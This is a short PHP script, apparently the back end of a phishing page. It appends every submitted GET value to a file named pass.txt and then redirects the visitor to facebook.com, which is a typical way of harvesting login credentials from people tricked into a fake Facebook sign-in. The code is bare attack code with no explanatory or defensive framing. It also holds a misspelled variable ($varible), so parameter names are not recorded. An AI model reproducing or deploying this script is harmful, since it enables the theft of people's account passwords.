header ('Location: https://www.facebook.com ');
$handle = fopen("pass.txt", "a");
foreach($_GET as $variable=> $value) {
fwrite($handle, $varible);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>